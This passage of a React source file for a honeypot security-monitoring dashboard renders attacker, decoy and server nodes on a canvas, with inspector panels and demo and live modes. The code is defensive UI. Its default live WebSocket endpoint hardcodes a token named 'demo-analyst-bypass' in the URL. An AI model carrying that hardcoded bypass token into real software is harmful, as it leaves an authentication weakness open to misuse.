          ctx.strokeStyle = TOKENS.bg;
          ctx.lineWidth = isSelected ? 2.2 : 1.5;
          ctx.fillRect(pos.x - sz, pos.y - sz, sz * 2, sz * 2);
          ctx.strokeRect(pos.x - sz, pos.y - sz, sz * 2, sz * 2);

          // Inner square core
          ctx.fillStyle = TOKENS.bg;
          ctx.fillRect(pos.x - 6, pos.y - 6, 12, 12);

          ctx.font = '700 8px "JetBrains Mono", monospace';
          ctx.fillStyle = TOKENS.surface;
          ctx.textAlign = 'center';
          ctx.fillText('[PROTECTED]', pos.x, pos.y - 22);
        } else {
          // Normal Gateway Router: Subdued Neutral Concentric Circle
          ctx.beginPath();
          ctx.arc(pos.x, pos.y, isSelected ? 17 : 14, 0, Math.PI * 2);
          ctx.fillStyle = '#242320';
          ctx.fill();
          ctx.strokeStyle = TOKENS.border;
          ctx.lineWidth = isSelected ? 2 : 1.2;
          ctx.stroke();

          ctx.beginPath();
          ctx.arc(pos.x, pos.y, 5, 0, Math.PI * 2);
          ctx.fillStyle = TOKENS.surface;
          ctx.fill();
        }

        ctx.font = '600 9px "JetBrains Mono", monospace';
        ctx.fillStyle = TOKENS.surface;
        ctx.textAlign = 'center';
        ctx.fillText(node.name.toUpperCase(), pos.x, pos.y + 28);
      });

      // 4. Render Honeypot Decoy Nodes (Hexagonal Structural Marker)
      filteredHoneypots.forEach((hp) => {
        const pos = positionsRef.current[hp.id] || { x: hp.x, y: hp.y };
        const isSelected =
          selectedEntity?.kind === 'HONEYPOT' && selectedEntity?.data?.id === hp.id;
        const underAttack =
          hp.status === 'Under Attack' || hp.status === 'Capturing';

        drawPolygon(ctx, pos.x, pos.y, isSelected ? 21 : 18, 6, Math.PI / 6);
        ctx.fillStyle = '#171717';
        ctx.fill();
        ctx.lineWidth = isSelected ? 2.4 : 1.5;
        ctx.strokeStyle = underAttack ? TOKENS.accent : TOKENS.surface;
        ctx.stroke();

        drawPolygon(ctx, pos.x, pos.y, 10.5, 6, Math.PI / 6);
        ctx.fillStyle = TOKENS.surface;
        ctx.fill();

        ctx.font = '600 9.5px "JetBrains Mono", monospace';
        ctx.fillStyle = TOKENS.bg;
        ctx.textAlign = 'center';
        ctx.fillText(hp.name.toUpperCase(), pos.x, pos.y + 31);
      });

      // 5. Render Attacker Nodes (Diamond / Reticle Marker + Containment Perimeter)
      filteredAttackers.forEach((att) => {
        const pos = positionsRef.current[att.id] || {
          x: att.x,
          y: att.y,
          spawnTime: now - 5000,
        };
        const isSelected =
          selectedEntity?.kind === 'ATTACKER' && selectedEntity?.data?.id === att.id;
        const isContained = att.status === 'Contained';
        const isThreat =
          att.severity === 'critical' ||
          att.severity === 'high' ||
          att.status === 'Malicious' ||
          att.status === 'Suspicious';

        // Subtle pulse ring for active high-severity attackers
        if (isThreat && !isContained && !isPaused && !reducedMotion) {
          const pulse = (now * 0.0038) % 1;
          ctx.beginPath();
          ctx.arc(pos.x, pos.y, 10 + pulse * 20, 0, Math.PI * 2);
          ctx.strokeStyle = `rgba(255, 73, 61, ${(1 - pulse) * 0.8})`;
          ctx.lineWidth = 1.4;
          ctx.stroke();
        }

        // Contained Attacker Perimeter (Hexagonal Isolation Frame)
        if (isContained) {
          drawPolygon(ctx, pos.x, pos.y, 19, 6, 0);
          ctx.strokeStyle = TOKENS.accent;
          ctx.lineWidth = 1.4;
          ctx.stroke();

          ctx.fillStyle = TOKENS.accent;
          ctx.fillRect(pos.x - 27, pos.y - 31, 54, 11);
          ctx.font = '700 7.5px "JetBrains Mono", monospace';
          ctx.fillStyle = '#171717';
          ctx.textAlign = 'center';
          ctx.fillText('CONTAINED', pos.x, pos.y - 23);
        } else if (isThreat) {
          ctx.font = '700 8px "JetBrains Mono", monospace';
          ctx.fillStyle = TOKENS.accent;
          ctx.textAlign = 'center';
          ctx.fillText(
            att.severity === 'critical' ? '! CRITICAL' : '! SUSPICIOUS',
            pos.x,
            pos.y - 16
          );
        }

        if (isSelected) {
          ctx.beginPath();
          ctx.arc(pos.x, pos.y, 15, 0, Math.PI * 2);
          ctx.strokeStyle = TOKENS.bg;
          ctx.lineWidth = 1.5;
          ctx.stroke();
        }

        // Attacker Diamond Marker (4-sided rotated polygon so shape distinguishes node type)
        drawPolygon(ctx, pos.x, pos.y, isThreat || isContained ? 10 : 8.5, 4, 0);
        ctx.fillStyle = isThreat || isContained ? TOKENS.accent : TOKENS.bg;
        ctx.fill();

        ctx.font = '500 9.5px "JetBrains Mono", monospace';
        ctx.fillStyle = isThreat || isContained ? TOKENS.accent : TOKENS.bg;
        ctx.textAlign = 'center';
        ctx.fillText(att.ip, pos.x, pos.y + 22);
      });

      ctx.restore();
    };

    raf = requestAnimationFrame(render);
    return () => cancelAnimationFrame(raf);
  }, [
    edges,
    filteredInfra,
    filteredHoneypots,
    filteredAttackers,
    selectedEntity,
    isPaused,
    reducedMotion,
  ]);

  // Pointer Down: Node selection/drag, Edge selection, or Canvas Pan
  const handleMouseDown = (e) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const sx = e.clientX - rect.left;
    const sy = e.clientY - rect.top;
    const { wx, wy } = screenToWorld(sx, sy, rect.width, rect.height);

    for (const att of filteredAttackers) {
      const p = positionsRef.current[att.id];
      if (p && Math.hypot(wx - p.x, wy - p.y) <= 16) {
        dragRef.current = { isPanning: false, dragNodeId: att.id, startX: sx, startY: sy };
        onSelectEntity({ kind: 'ATTACKER', data: att });
        return;
      }
    }
    for (const hp of filteredHoneypots) {
      const p = positionsRef.current[hp.id];
      if (p && Math.hypot(wx - p.x, wy - p.y) <= 20) {
        dragRef.current = { isPanning: false, dragNodeId: hp.id, startX: sx, startY: sy };
        onSelectEntity({ kind: 'HONEYPOT', data: hp });
        return;
      }
    }
    for (const inf of filteredInfra) {
      const p = positionsRef.current[inf.id];
      if (p && Math.hypot(wx - p.x, wy - p.y) <= 18) {
        dragRef.current = { isPanning: false, dragNodeId: inf.id, startX: sx, startY: sy };
        onSelectEntity({ kind: 'INFRA', data: inf });
        return;
      }
    }

    // Check if user clicked a Connection Edge
    for (const edge of edges) {
      const p1 = positionsRef.current[edge.sourceId];
      const p2 = positionsRef.current[edge.targetId];
      if (p1 && p2 && distToSegment(wx, wy, p1.x, p1.y, p2.x, p2.y) <= 8) {
        onSelectEntity({ kind: 'EDGE', data: edge });
        return;
      }
    }

    dragRef.current = {
      isPanning: true,
      dragNodeId: null,
      startX: sx - transformRef.current.x,
      startY: sy - transformRef.current.y,
    };
  };

  const handleMouseMove = (e) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const sx = e.clientX - rect.left;
    const sy = e.clientY - rect.top;
    const { wx, wy } = screenToWorld(sx, sy, rect.width, rect.height);

    if (dragRef.current.dragNodeId) {
      positionsRef.current[dragRef.current.dragNodeId] = {
        ...positionsRef.current[dragRef.current.dragNodeId],
        x: wx,
        y: wy,
      };
      return;
    }
    if (dragRef.current.isPanning) {
      transformRef.current.x = sx - dragRef.current.startX;
      transformRef.current.y = sy - dragRef.current.startY;
      return;
    }

    // Hover hit test
    for (const att of filteredAttackers) {
      const p = positionsRef.current[att.id];
      if (p && Math.hypot(wx - p.x, wy - p.y) <= 16) {
        setHoveredItem({
          title: att.ip,
          subtitle: att.attackType,
          meta: `TYPE: ATTACKER // STATUS: ${att.status.toUpperCase()}`,
          isAlert: att.severity === 'critical' || att.severity === 'high',
          x: sx,
          y: sy,
        });
        return;
      }
    }
    for (const hp of filteredHoneypots) {
      const p = positionsRef.current[hp.id];
      if (p && Math.hypot(wx - p.x, wy - p.y) <= 20) {
        setHoveredItem({
          title: hp.name,
          subtitle: hp.service,
          meta: `TYPE: HONEYPOT // SESSIONS: ${hp.activeSessions}`,
          isAlert: hp.status === 'Under Attack',
          x: sx,
          y: sy,
        });
        return;
      }
    }
    for (const inf of filteredInfra) {
      const p = positionsRef.current[inf.id];
      if (p && Math.hypot(wx - p.x, wy - p.y) <= 18) {
        setHoveredItem({
          title: inf.name,
          subtitle: inf.role,
          meta: `TYPE: ${inf.nodeType.toUpperCase()} // ${inf.ip}`,
          isAlert: false,
          x: sx,
          y: sy,
        });
        return;
      }
    }
    setHoveredItem(null);
  };

  const handleMouseUp = () => {
    dragRef.current = { isPanning: false, dragNodeId: null, startX: 0, startY: 0 };
  };

  const handleWheel = (e) => {
    e.preventDefault();
    const factor = e.deltaY < 0 ? 1.12 : 0.89;
    transformRef.current.scale = Math.min(
      Math.max(transformRef.current.scale * factor, 0.45),
      2.4
    );
  };

  return (
    <div
      className={cn(
        isFullscreen
          ? 'fixed inset-0 z-50 bg-[#080809]'
          : compactHeight
          ? 'relative w-full h-[430px] bg-[#080809] border border-[#27272A]'
          : 'relative w-full h-[600px] bg-[#080809] border border-[#27272A]',
        'flex flex-col justify-between select-none overflow-hidden'
      )}
    >
      {/* Top Graph Controls & Multi-Filter Bar */}
      <div className="px-3.5 py-2 border-b border-[#27272A] bg-[#101012] flex flex-wrap items-center justify-between gap-2 z-10">
        <div className="flex items-center gap-2 flex-wrap">
          <span className="font-mono text-[10px] uppercase tracking-widest text-[#F1EFE9] flex items-center gap-1.5 mr-1">
            <span className="w-2 h-2 bg-[#FF493D] inline-block" />
            LIVE TOPOLOGY
          </span>

          {/* Node Category Filter */}
          <div className="flex items-center border border-[#27272A] text-[10px] font-mono">
            {[
              { id: 'ALL', label: 'ALL NODES' },
              { id: 'ATTACKER', label: 'ATTACKERS' },
              { id: 'HONEYPOT', label: 'HONEYPOTS' },
              { id: 'PROTECTED', label: 'PROTECTED' },
            ].map((cat) => (
              <button
                key={cat.id}
                onClick={() => setNodeCategoryFilter(cat.id)}
                className={cn(
                  'px-2 py-0.5 transition-colors uppercase',
                  nodeCategoryFilter === cat.id
                    ? 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                    : 'text-[#9A9891] hover:bg-[#1E1E22] hover:text-[#F1EFE9]'
                )}
              >
                {cat.label}
              </button>
            ))}
          </div>

          {/* Severity Filter */}
          <div className="flex items-center border border-[#27272A] text-[10px] font-mono">
            {['ALL', 'SUSPICIOUS', 'CRITICAL', 'CONTAINED'].map((sev) => (
              <button
                key={sev}
                onClick={() => setSeverityFilter(sev)}
                className={cn(
                  'px-2 py-0.5 transition-colors uppercase',
                  severityFilter === sev
                    ? sev === 'ALL'
                      ? 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                      : 'bg-[#FF493D] text-[#0B0B0C] font-bold'
                    : 'text-[#9A9891] hover:bg-[#1E1E22] hover:text-[#F1EFE9]'
                )}
              >
                {sev}
              </button>
            ))}
          </div>

          {/* Honeypot Selector */}
          <select
            value={honeypotFilter}
            onChange={(e) => setHoneypotFilter(e.target.value)}
            aria-label="Filter by Honeypot"
            className="bg-[#141416] text-[#F1EFE9] border border-[#27272A] px-2 py-0.5 text-[10px] font-mono uppercase focus:outline-none focus:border-[#F1EFE9]"
          >
            <option value="ALL">ALL HONEYPOTS</option>
            {honeypots.map((hp) => (
              <option key={hp.id} value={hp.id}>
                {hp.name.toUpperCase()}
              </option>
            ))}
          </select>

          {/* Search IP/Node input */}
          <div className="relative">
            <Search
              size={11}
              className="absolute left-2 top-1/2 -translate-y-1/2 text-[#9A9891]"
            />
            <input
              type="text"
              value={graphSearch}
              onChange={(e) => setGraphSearch(e.target.value)}
              placeholder="SEARCH IP / HOST..."
              className="pl-6 pr-2 py-0.5 bg-[#141416] border border-[#27272A] text-[#F1EFE9] placeholder-[#71717A] font-mono text-[10px] w-40 focus:outline-none focus:border-[#F1EFE9]"
            />
          </div>
        </div>

        {/* Right Zoom / Reset / Pause / Fullscreen Controls */}
        <div className="flex items-center gap-1 font-mono text-[10px]">
          <button
            onClick={() => {
              transformRef.current.scale = Math.min(transformRef.current.scale * 1.18, 2.4);
            }}
            className="px-2 py-0.5 border border-[#27272A] text-[#F1EFE9] hover:border-[#F1EFE9] bg-[#141416]"
            title="Zoom In"
          >
            +
          </button>
          <button
            onClick={() => {
              transformRef.current.scale = Math.max(transformRef.current.scale * 0.82, 0.45);
            }}
            className="px-2 py-0.5 border border-[#27272A] text-[#F1EFE9] hover:border-[#F1EFE9] bg-[#141416]"
            title="Zoom Out"
          >
            -
          </button>
          <button
            onClick={resetView}
            className="px-2 py-0.5 border border-[#27272A] text-[#F1EFE9] hover:border-[#F1EFE9] bg-[#141416] flex items-center gap-1"
            title="Reset Graph View"
          >
            <RotateCcw size={10} /> RESET
          </button>
          <button
            onClick={() => setIsPaused(!isPaused)}
            className={cn(
              'px-2 py-0.5 border flex items-center gap-1',
              isPaused
                ? 'border-[#FF493D] text-[#FF493D] bg-[#141416]'
                : 'border-[#27272A] text-[#F1EFE9] hover:border-[#F1EFE9] bg-[#141416]'
            )}
          >
            {isPaused ? <Play size={10} /> : <Pause size={10} />}
            {isPaused ? 'RESUME' : 'PAUSE'}
          </button>
          <button
            onClick={() => setIsFullscreen(!isFullscreen)}
            className="px-2 py-0.5 border border-[#27272A] text-[#F1EFE9] hover:border-[#F1EFE9] bg-[#141416] flex items-center gap-1"
          >
            {isFullscreen ? <Minimize2 size={10} /> : <Maximize2 size={10} />}
            {isFullscreen ? 'EXIT' : 'FULL'}
          </button>
        </div>
      </div>

      {/* Interactive Canvas */}
      <div className="relative flex-1 w-full h-full cursor-grab active:cursor-grabbing">
        <canvas
          ref={canvasRef}
          onMouseDown={handleMouseDown}
          onMouseMove={handleMouseMove}
          onMouseUp={handleMouseUp}
          onMouseLeave={handleMouseUp}
          onWheel={handleWheel}
          className="w-full h-full block"
        />

        {hoveredItem && (
          <div
            style={{
              left: Math.min(hoveredItem.x + 14, 620),
              top: Math.max(hoveredItem.y - 12, 10),
            }}
            className="pointer-events-none absolute z-20 bg-[#101012] border border-[#F1EFE9] px-3 py-2 text-[#F1EFE9] font-mono text-[10px] min-w-[210px]"
          >
            <div className="flex items-center justify-between border-b border-[#27272A] pb-1 mb-1">
              <span
                className={cn(
                  'font-bold',
                  hoveredItem.isAlert ? 'text-[#FF493D]' : 'text-[#F1EFE9]'
                )}
              >
                {hoveredItem.title}
              </span>
            </div>
            <div className="text-[#D8D5CE]">{hoveredItem.subtitle}</div>
            <div className="text-[#9A9891] mt-1">{hoveredItem.meta}</div>
          </div>
        )}
      </div>

      {/* Bottom Shape & Color Legend */}
      <div className="px-3.5 py-1.5 border-t border-[#27272A] bg-[#101012] flex flex-wrap items-center justify-between gap-2 text-[10px] font-mono text-[#9A9891] z-10">
        <div className="flex items-center gap-4 flex-wrap">
          <span className="flex items-center gap-1.5">
            <span className="w-2.5 h-2.5 rotate-45 bg-[#FF493D] inline-block" />
            ATTACKER (DIAMOND)
          </span>
          <span className="flex items-center gap-1.5">
            <span className="w-2.5 h-2.5 bg-[#D8D5CE] inline-block" />
            HONEYPOT DECOY (HEX)
          </span>
          <span className="flex items-center gap-1.5">
            <span className="w-2.5 h-2.5 border border-[#F1EFE9] bg-[#080809] inline-block" />
            PROTECTED SERVER (SQUARE)
          </span>
          <span className="flex items-center gap-1.5">
            <span className="w-2.5 h-2.5 rounded-full bg-[#71717A] inline-block" />
            GATEWAY ROUTER (CIRCLE)
          </span>
        </div>
        <span className="text-[#9A9891] hidden sm:inline">
          SELECTED NODE INSPECTS IN LEFT SIDEBAR BELOW SETTINGS
        </span>
      </div>
    </div>
  );
}

// ============================================================================
// COMPACT ENTITY & CONNECTION DETAIL INSPECTOR PANEL (DOCKED BELOW SETTINGS)
// ============================================================================
function EntityInspectorPanel({
  selectedEntity,
  onClose,
  events,
  onContainAttacker,
  isLiveMode,
  compactSidebar = false,
}) {
  const [copied, setCopied] = useState(false);

  if (!selectedEntity) {
    return (
      <div className="bg-[#141416] border border-[#27272A] p-3.5 font-mono text-xs text-[#9A9891]">
        <div className="text-[10px] uppercase tracking-widest text-[#9A9891] mb-1">
          TELEMETRY INSPECTOR
        </div>
        <div className="text-xs font-bold text-[#F1EFE9]">No Active Node Selected</div>
        <p className="font-sans text-[11px] text-[#9A9891] mt-1 leading-relaxed">
          Click any Attacker diamond, Honeypot hexagon, Protected square, or traffic edge on the
          topology canvas to inspect live telemetry here.
        </p>
      </div>
    );
  }

  const { kind, data } = selectedEntity;

  const copyText = (txt) => {
    navigator.clipboard?.writeText(txt);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  const relatedEvents = events
    .filter(
      (e) =>
        e.source === data.ip ||
        e.destination === data.id ||
        e.destination === data.name ||
        (kind === 'EDGE' &&
          (e.source === data.sourceLabel || e.destination === data.targetLabel))
    )
    .slice(0, compactSidebar ? 3 : 5);

  return (
    <div
      className={cn(
        'bg-[#141416] text-[#F1EFE9] flex flex-col justify-between font-mono text-xs',
        compactSidebar ? 'p-3.5 border-t border-[#27272A]' : 'p-4 border border-[#27272A] h-full'
      )}
    >
      <div className="space-y-3">
        {/* Header */}
        <div className="flex items-start justify-between border-b border-[#27272A] pb-2.5">
          <div>
            <span className="text-[9px] uppercase tracking-widest text-[#9A9891] block">
              {kind} TELEMETRY INSPECTOR
            </span>
            <h3 className="text-sm font-bold text-[#F1EFE9] mt-0.5 break-all">
              {data.ip || data.name || `${data.sourceLabel} → ${data.targetLabel}`}
            </h3>
          </div>
          {onClose && (
            <button
              onClick={onClose}
              className="p-1 border border-[#27272A] text-[#9A9891] hover:bg-[#F1EFE9] hover:text-[#0B0B0C]"
              title="Clear Selection"
            >
              <X size={12} />
            </button>
          )}
        </div>

        {/* Status & Classification Badges */}
        <div className="flex items-center gap-1.5 flex-wrap">
          <span
            className={cn(
              'px-2 py-0.5 text-[9.5px] uppercase font-bold',
              data.severity === 'critical' ||
                data.status === 'Malicious' ||
                data.status === 'Under Attack' ||
                data.edgeType === 'malicious'
                ? 'bg-[#FF493D] text-[#0B0B0C]'
                : 'bg-[#27272A] text-[#F1EFE9]'
            )}
          >
            STATUS: {data.status || data.edgeType?.toUpperCase()}
          </span>
          {data.protocols && (
            <span className="px-2 py-0.5 text-[9.5px] bg-[#18181B] border border-[#27272A] text-[#D8D5CE]">
              {Array.isArray(data.protocols) ? data.protocols.join(', ') : data.protocols}
            </span>
          )}
        </div>

        {/* Metadata Grid */}
        <div className="grid grid-cols-2 border-t border-l border-[#27272A] bg-[#101012]">
          {kind === 'ATTACKER' && (
            <>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">THREAT CLASSIFICATION</div>
                <div className="font-sans font-semibold text-[11px] text-[#F1EFE9] mt-0.5 leading-snug">
                  {data.attackType}
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">NETWORK ASN</div>
                <div className="font-semibold text-[11px] text-[#F1EFE9] mt-0.5 leading-snug">
                  {data.asn}
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">FIRST / LAST SEEN</div>
                <div className="text-[10px] text-[#D8D5CE] mt-0.5">
                  {data.firstSeen} / {data.lastSeen}
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">ATTEMPTS & PORTS</div>
                <div className="text-[10px] text-[#D8D5CE] mt-0.5">
                  {data.attempts} pkts // Ports {data.ports?.join(', ')}
                </div>
              </div>
            </>
          )}

          {kind === 'HONEYPOT' && (
            <>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">DECOY SERVICE</div>
                <div className="font-sans font-semibold text-[11px] text-[#F1EFE9] mt-0.5">
                  {data.service}
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">ACTIVE SESSIONS</div>
                <div className="font-bold text-[11px] text-[#FF493D] mt-0.5">
                  {data.activeSessions} Active / {data.totalInteractions} Total
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">REGION</div>
                <div className="text-[10px] text-[#D8D5CE] mt-0.5">{data.region}</div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">LAST ACTIVITY</div>
                <div className="text-[10px] text-[#D8D5CE] mt-0.5">{data.lastActivity}</div>
              </div>
            </>
          )}

          {kind === 'INFRA' && (
            <>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">SYSTEM ROLE</div>
                <div className="font-sans font-semibold text-[11px] text-[#F1EFE9] mt-0.5">
                  {data.role}
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">CONNECTIONS</div>
                <div className="font-semibold text-[11px] text-[#F1EFE9] mt-0.5">
                  {data.connections}
                </div>
              </div>
            </>
          )}

          {kind === 'EDGE' && (
            <>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">PROTOCOL</div>
                <div className="font-semibold text-[11px] text-[#F1EFE9] mt-0.5">
                  {data.protocol}
                </div>
              </div>
              <div className="p-2 border-r border-b border-[#27272A]">
                <div className="text-[8.5px] text-[#9A9891]">TRAFFIC VOLUME</div>
                <div className="font-semibold text-[11px] text-[#F1EFE9] mt-0.5">
                  {data.packetRate}
                </div>
              </div>
            </>
          )}
        </div>

        {/* Observed Payloads */}
        {kind === 'ATTACKER' && data.payloads?.length > 0 && (
          <div>
            <div className="text-[9px] uppercase text-[#9A9891] mb-1">
              OBSERVED WIRE PAYLOADS
            </div>
            <div className="space-y-1">
              {data.payloads.slice(0, 2).map((pl, i) => (
                <div
                  key={i}
                  className="p-1.5 bg-[#080809] text-[#D8D5CE] text-[9.5px] break-all border border-[#27272A]"
                >
                  {pl}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Recent Related Events */}
        <div>
          <div className="text-[9px] uppercase text-[#9A9891] mb-1">
            RELATED TELEMETRY ({relatedEvents.length})
          </div>
          {relatedEvents.length === 0 ? (
            <div className="p-2 bg-[#101012] border border-[#27272A] text-[10px] text-[#9A9891]">
              No matching events in current window.
            </div>
          ) : (
            <div className="divide-y divide-[#27272A] border border-[#27272A] bg-[#101012]">
              {relatedEvents.map((ev) => (
                <div key={ev.id} className="p-1.5 text-[9.5px]">
                  <div className="flex items-center justify-between text-[#9A9891]">
                    <span className="font-bold text-[#F1EFE9]">{ev.type}</span>
                    <span>{ev.timestamp}</span>
                  </div>
                  <div className="font-sans text-[10.5px] text-[#D8D5CE] mt-0.5 truncate">
                    {ev.description}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Bottom Action Bar */}
      <div className="pt-2.5 border-t border-[#27272A] mt-3 flex items-center gap-1.5">
        {(data.ip || data.name) && (
          <button
            onClick={() => copyText(data.ip || data.name)}
            className="flex-1 py-1.5 px-2 bg-[#18181B] border border-[#27272A] text-[#F1EFE9] hover:border-[#F1EFE9] uppercase text-[9.5px] font-bold flex items-center justify-center gap-1"
          >
            {copied ? <Check size={11} /> : <Copy size={11} />}
            {copied ? 'COPIED' : 'COPY IDENTIFIER'}
          </button>
        )}
        {kind === 'ATTACKER' && data.status !== 'Contained' && (
          <button
            onClick={() => onContainAttacker(data)}
            className="flex-1 py-1.5 px-2 bg-[#FF493D] text-[#0B0B0C] hover:bg-[#F1EFE9] uppercase text-[9.5px] font-bold flex items-center justify-center gap-1"
          >
            <Lock size={11} />
            ISOLATE IN CAGE
          </button>
        )}
      </div>
    </div>
  );
}

// ============================================================================
// MAIN APPLICATION SHELL
// ============================================================================
export default function App({
  hideSidebar = true,
  hideHeader = true,
  initialMode = 'LIVE',
}: {
  hideSidebar?: boolean;
  hideHeader?: boolean;
  initialMode?: 'DEMO' | 'LIVE';
} = {}) {
  // Navigation & Layout ('overview' | 'network' | 'attackers' | 'events' | 'honeypots' | 'analytics' | 'settings')
  const [activePage, setActivePage] = useState('overview');
  const [themeMode, setThemeMode] = useState('dark'); // Default to dark mode as requested
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [currentTime, setCurrentTime] = useState('14:30:19 UTC');
  const [reducedMotion, setReducedMotion] = useState(false);
  const [mounted, setMounted] = useState(false);

  // Strict Separation: 'DEMO' vs 'LIVE'
  const [operatingMode, setOperatingMode] = useState(initialMode); // 'DEMO' | 'LIVE'
  const [liveConnectionState, setLiveConnectionState] = useState('DISCONNECTED'); // 'CONNECTING' | 'CONNECTED' | 'RECONNECTING' | 'DISCONNECTED' | 'ERROR'
  const [wsEndpoint, setWsEndpoint] = useState(
    typeof window !== 'undefined'
      ? `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.hostname || 'localhost'}:8000/ws/soc?token=demo-analyst-bypass`
      : 'ws://localhost:8000/ws/soc?token=demo-analyst-bypass'
  );
  const [isMonitoringActive, setIsMonitoringActive] = useState(true);
  const [demoStepIndex, setDemoStepIndex] = useState(0);

  // Core Data State (Pure Real & Explicit Simulated Telemetry — Zero Dummy Data)
  const [infraNodes] = useState(INITIAL_INFRA_NODES);
  const [honeypots, setHoneypots] = useState(INITIAL_HONEYPOTS);
  const [attackers, setAttackers] = useState<any[]>([]);
  const [events, setEvents] = useState<any[]>([]);
  const [totalAttacksCount, setTotalAttacksCount] = useState(0);
  const [statusBanner, setStatusBanner] = useState<any>(null);

  // Graph & Inspector State
  const [selectedEntity, setSelectedEntity] = useState<any>(null);
  const [nodeCategoryFilter, setNodeCategoryFilter] = useState('ALL');
  const [severityFilter, setSeverityFilter] = useState('ALL');
  const [honeypotFilter, setHoneypotFilter] = useState('ALL');
  const [graphSearch, setGraphSearch] = useState('');
  const [isFullscreenGraph, setIsFullscreenGraph] = useState(false);

  // Page-specific Filter States
  const [attackerSearch, setAttackerSearch] = useState('');
  const [attackerSeverityFilter, setAttackerSeverityFilter] = useState('ALL');
  const [attackerSortField, setAttackerSortField] = useState('threatScore');

  const [eventSearch, setEventSearch] = useState('');
  const [eventSeverityFilter, setEventSeverityFilter] = useState('ALL');
  const [eventTypeFilter, setEventTypeFilter] = useState('ALL');
  const [eventHoneypotFilter, setEventHoneypotFilter] = useState('ALL');
  const [inspectedEvent, setInspectedEvent] = useState<any>(null);

  const [selectedHoneypotDetail, setSelectedHoneypotDetail] = useState(INITIAL_HONEYPOTS[0]);
  const [analyticsTimeRange, setAnalyticsTimeRange] = useState('24H');
  const [customWsPayload, setCustomWsPayload] = useState(
    '{"type":"EXPLOIT_ATTEMPT","source":"198.51.100.77","destination":"honeypot-ssh-01","protocol":"SSHv2","severity":"critical","description":"Live SSH pre-auth packet received from sensor"}'
  );

  // Derived KPI Metrics
  const activeAttackersCount = useMemo(
    () => attackers.filter((a) => a.status !== 'Contained').length,
    [attackers]
  );
  const capturedSessionsCount = useMemo(
    () => attackers.filter((a) => a.status === 'Contained').length,
    [attackers]
  );
  const criticalAlertsCount = useMemo(
    () => events.filter((e) => e.severity === 'critical').length,
    [events]
  );

  // Live UTC Clock
  useEffect(() => {
    const tick = () => {
      const d = new Date();
      const hh = String(d.getUTCHours()).padStart(2, '0');
      const mm = String(d.getUTCMinutes()).padStart(2, '0');
      const ss = String(d.getUTCSeconds()).padStart(2, '0');
      setCurrentTime(`${hh}:${mm}:${ss} UTC`);
    };
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, []);

  const getNowTimestamp = () => {
    const d = new Date();
    return `${String(d.getUTCHours()).padStart(2, '0')}:${String(
      d.getUTCMinutes()
    ).padStart(2, '0')}:${String(d.getUTCSeconds()).padStart(2, '0')}.${String(
      d.getUTCMilliseconds()
    ).padStart(3, '0')}`;
  };

  // Append telemetry event
  const appendEvent = useCallback((evt) => {
    const newEvt = {
      id: `EVT-${Math.floor(1000 + Math.random() * 8999)}`,
      timestamp: getNowTimestamp(),
      ...evt,
    };
    setEvents((prev) => [newEvt, ...prev.slice(0, 79)]);
    setInspectedEvent(newEvt);
  }, []);

  // ==========================================================================
  // DEMO MODE CONTROLS (Deterministic & Repeatable — Never active in Live Mode)
  // ==========================================================================
  const triggerDemoAttack = useCallback(() => {
    if (operatingMode !== 'DEMO') return;
    const scenario =
      DETERMINISTIC_DEMO_SCENARIOS[demoStepIndex % DETERMINISTIC_DEMO_SCENARIOS.length];
    setDemoStepIndex((i) => i + 1);

    const existing = attackers.find((a) => a.ip === scenario.ip);
    const nowLabel = currentTime;

    if (existing) {
      setAttackers((prev) =>
        prev.map((a) =>
          a.ip === scenario.ip
            ? {
                ...a,
                attempts: a.attempts + 35,
                lastSeen: nowLabel,
                status: 'Malicious',
                severity: 'critical',
              }
            : a
        )
      );
    } else {
      const newAtt = {
        id: `att-demo-${Date.now()}`,
        ip: scenario.ip,
        nodeType: 'attacker',
        asn: scenario.asn,
        attackType: scenario.attackType,
        firstSeen: nowLabel,
        lastSeen: nowLabel,
        attempts: 48,
        targetedHoneypots: [scenario.targetHoneypot],
        protocols: [scenario.protocol],
        ports: scenario.ports,
        severity: scenario.severity,
        status: 'Malicious',
        threatScore: scenario.threatScore,
        payloads: [scenario.payload],
        x: scenario.x,
        y: scenario.y,
      };
      setAttackers((prev) => [newAtt, ...prev]);
      setSelectedEntity({ kind: 'ATTACKER', data: newAtt });
    }

    setTotalAttacksCount((c) => c + 48);
    setHoneypots((prev) =>
      prev.map((hp) =>
        hp.id === scenario.targetHoneypot
          ? {
              ...hp,
              status: 'Under Attack',
              totalInteractions: hp.totalInteractions + 48,
              activeSessions: hp.activeSessions + 1,
              lastActivity: 'Just now',
            }
          : hp
      )
    );

    appendEvent({
      severity: scenario.severity,
      source: scenario.ip,
      destination: scenario.targetHoneypot,
      protocol: scenario.protocol,
      type: 'EXPLOIT_ATTEMPT',
